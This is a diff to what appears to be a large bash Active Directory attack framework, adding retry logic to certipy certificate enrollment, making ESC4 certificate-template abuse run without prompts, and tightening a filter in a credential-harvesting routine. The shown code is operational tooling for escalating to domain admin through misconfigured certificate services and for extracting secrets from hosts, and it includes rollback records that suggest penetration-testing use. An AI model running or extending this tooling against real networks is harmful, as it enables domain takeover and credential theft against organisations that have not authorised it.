@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.41.0"
+readonly VERSION="1.42.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -3451,8 +3451,25 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
     # PFX, and "save private key? (y/N)" on a failed request — `</dev/null` made
     # those EOF and we LOST a freshly-issued cert. `yes` answers them so the cert
     # is always written, then we read its real filename from certipy's own output.
-    local out; out=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy "${rargs[@]}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
-    local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
+    # certipy's RPC/ICPR enrollment is flaky ("NETBIOS connection timed out", reset),
+    # and right after an ESC4 template rewrite the CA may not have picked up the new
+    # config yet — both are TRANSIENT. Retry a few times with a short backoff; but a
+    # PERMANENT denial (TEMPLATE_DENIED / access denied) won't fix itself, so bail on it.
+    local out="" pfx="" attempt
+    for attempt in 1 2 3 4; do
+        out=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy "${rargs[@]}" 2>&1 )
+        echo "$out" | tee -a "$LOGFILE"
+        pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
+        [[ -n "$pfx" && -f "$OUTDIR/$pfx" ]] && break
+        if grep -qiE 'TEMPLATE_DENIED|ACCESS_DENIED|[[:space:]]denied|not allowed|CERTSRV_E' <<<"$out"; then
+            break        # permanent permission error — retrying is pointless
+        fi
+        if grep -qiE 'timed out|NETBIOS|connection (was )?reset|connection refused|rpc_s_|ProtocolError|broken pipe|unreachable|KRB_AP_ERR|RPC_E' <<<"$out" && (( attempt < 4 )); then
+            warn "  ${label}: enrollment transport error / template not propagated yet (attempt ${attempt}/4) → retrying in 6s…"
+            sleep 6; continue
+        fi
+        break
+    done
     _adcs_pwn_pfx "$pfx" "$label"
 }
 
@@ -3474,14 +3491,15 @@ _adcs_esc3() {
 _adcs_esc4() {
     local ca="$1" tpl="$2"; _adcs_setauth
     abuse_confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
+    # -force: don't prompt "Are you sure? (y/N)" — we run fully automatic under --abuse.
     ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
-        -write-default-configuration -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+        -write-default-configuration -force -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC4: overwrote template $tpl config" \
-              "certipy template -template '$tpl' -configuration '$OUTDIR/${tpl}.json' -dc-ip '$DC_IP'  # restore saved config"
+              "certipy template -template '$tpl' -write-configuration '$OUTDIR/${tpl}.json' -force -dc-ip '$DC_IP'  # restore saved config"
     _adcs_req_admin "$ca" "$tpl" "ESC4" 1; local rc=$?
-    # restore the original template configuration (best-effort)
+    # restore the original template configuration (best-effort, also non-interactive)
     [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy template "${_ADCS_AUTH[@]}" \
-        -template "$tpl" -configuration "${tpl}.json" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+        -template "$tpl" -write-configuration "${tpl}.json" -force -dc-ip "$DC_IP" </dev/null 2>&1 ) | tee -a "$LOGFILE"
     return $rc
 }
 # ESC7 — ManageCA/ManageCertificates: enable SubCA, request (pending), self-issue, retrieve.
@@ -4059,9 +4077,12 @@ harvest_secrets() {
         # filter obvious non-secrets
         [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
         [[ "$s" == */* || "$s" == *\\* ]] && continue   # paths are not passwords
-        # FILENAMES masquerade as strong tokens (Bginfo64.exe, PsExec64.exe have
-        # upper+lower+digit) — drop anything ending in a known file extension.
-        [[ "$s" =~ \.(xml|bin|rels|png|jpg|jpeg|gif|bmp|svg|csv|ini|inf|pol|log|log1|log2|htb|local|exe|dll|sys|msi|msu|bat|cmd|ps1|psm1|vbs|com|cat|mui|tmp|dat|db|bak|lnk|url|cfg|config|conf|manifest|regtrans|regtrans-ms|blf|etl|evtx|node|json|txt|md|library-ms|mapimail|desklink|zfsendtotarget)$ ]] && continue
+        # FILENAMES masquerade as strong tokens (Bginfo64.exe, ntuser.dat.LOG1 have
+        # upper+lower+digit) — drop anything ending in a known file extension. Match
+        # case-INSENSITIVELY (${s,,}) so .LOG1/.DAT/.EXE are caught too, and accept an
+        # optional trailing .LOGn / .dat after the real ext (ntuser.dat.LOG1).
+        local _sl="${s,,}"
+        [[ "$_sl" =~ \.(xml|bin|rels|png|jpg|jpeg|gif|bmp|svg|csv|ini|inf|pol|log|log1|log2|htb|local|exe|dll|sys|msi|msu|bat|cmd|ps1|psm1|vbs|com|cat|mui|tmp|dat|db|bak|lnk|url|cfg|config|conf|manifest|regtrans|regtrans-ms|blf|etl|evtx|node|json|txt|md|library-ms|mapimail|desklink|zfsendtotarget)(\.log[12]?|\.dat)?$ ]] && continue
         # NTFS / journal artifacts: TMContainer0000000000000000001, $-prefixed, long zero runs
         [[ "$s" =~ ^[$] || "$s" =~ [Cc]ontainer[0-9]{6,} || "$s" =~ 0{8,} ]] && continue
         _plausible_secret "$s" || continue          # drop GUIDs, hex, blobs, fragments
